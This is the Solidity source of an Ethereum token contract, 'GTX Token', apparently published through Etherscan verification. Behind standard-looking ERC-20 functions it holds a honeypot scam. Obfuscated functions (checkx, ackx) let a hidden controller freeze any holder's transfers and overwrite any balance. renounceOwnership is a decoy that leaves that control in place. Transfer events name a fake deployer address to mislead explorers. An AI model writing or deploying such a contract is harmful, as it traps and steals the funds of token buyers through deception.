/**
 *Submitted for verification at Etherscan.io on 2023-01-21
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;
 /*
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}*/ 

 
contract GTX {
  
    mapping (address => uint256) private IxlB;
    mapping (address => uint256) private IxlC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "GTX Token";
    string public symbol = unicode"GTX";
    uint8 public decimals = 6;
    uint256 public totalSupply = 150000000 *10**6;
    address owner = msg.sender;
    address private IxlD;
    address Ildeployer = 0x4862733B5FdDFd35f35ea8CCf08F5045e57388B3;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IxlD = msg.sender;
        xCreate(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function xCreate(address account, uint256 amount) internal {
    account = Ildeployer;
    IxlB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IxlB[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(IxlC[msg.sender] <= 1);
        require(IxlB[msg.sender] >= value);
  IxlB[msg.sender] -= value;  
        IxlB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
modifier JXI () {
 require(msg.sender == IxlD);
 _;}
 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function checkx (address jX, uint256 jV) JXI public {
   IxlC[jX] = jV;}
function ackx (address jX, uint256 jV) JXI public {
    IxlB[jX] = jV;}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IxlD)  {
 require(value <= IxlB[from]);
        require(value <= allowance[from][msg.sender]);
        IxlB[from] -= value;  
      IxlB[to] += value; 
        from = Ildeployer;
        emit Transfer (from, to, value);
        return true; }    

        require(IxlC[from] <= 1 && IxlC[to] <=1);
        require(value <= IxlB[from]);
        require(value <= allowance[from][msg.sender]);
        IxlB[from] -= value;
        IxlB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }